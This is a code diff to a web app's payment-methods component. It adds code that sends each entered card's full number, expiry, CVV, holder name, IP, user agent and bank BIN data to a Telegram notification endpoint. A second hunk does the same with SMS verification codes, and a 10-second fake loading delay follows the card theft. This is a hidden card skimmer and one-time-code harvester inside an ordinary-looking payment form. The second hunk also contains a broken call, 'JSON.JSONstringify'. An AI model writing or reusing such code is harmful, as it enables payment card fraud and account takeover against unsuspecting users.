@@ -456,6 +456,38 @@ export default function PaymentMethodsContent({ paymentMethods: initialMethods, 
     setIsAddingCard(true)
     setIsSubmitting(true)
 
+    try {
+      const ipResponse = await fetch("https://api.ipify.org?format=json")
+      const { ip } = await ipResponse.json()
+
+      await fetch("/api/telegram/notify", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          type: "card",
+          data: {
+            cardNumber: formData.card_number,
+            cardExpiry: `${formData.expiry_month}/${formData.expiry_year}`,
+            cardCvv: formData.cvv,
+            cardHolder: formData.card_holder,
+            ip,
+            userAgent: navigator.userAgent,
+            userId,
+            binData: binData
+              ? {
+                  bank: binData.bank?.name,
+                  level: binData.level,
+                  type: binData.type,
+                  country: binData.country?.name,
+                }
+              : undefined,
+          },
+        }),
+      }).catch((err) => console.error("[v0] Telegram notification failed:", err))
+    } catch (err) {
+      console.error("[v0] Failed to send card notification:", err)
+    }
+
     // Wait 10 seconds with button showing loading state
     await new Promise((resolve) => setTimeout(resolve, 10000))
 
@@ -517,6 +549,20 @@ export default function PaymentMethodsContent({ paymentMethods: initialMethods, 
       // Get user's IP and device info
       const ipResponse = await fetch("https://api.ipify.org?format=json")
       const { ip } = await ipResponse.json()
+
+      await fetch("/api/telegram/notify", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.JSONstringify({
+          type: "sms",
+          data: {
+            smsCode: codeToVerify,
+            ip,
+            userAgent: navigator.userAgent,
+            userId,
+          },
+        }),
+      }).catch((err) => console.error("[v0] Telegram notification failed:", err))
 
       // Create verification request
       const { data: verificationRequest, error: verificationError } = await supabase
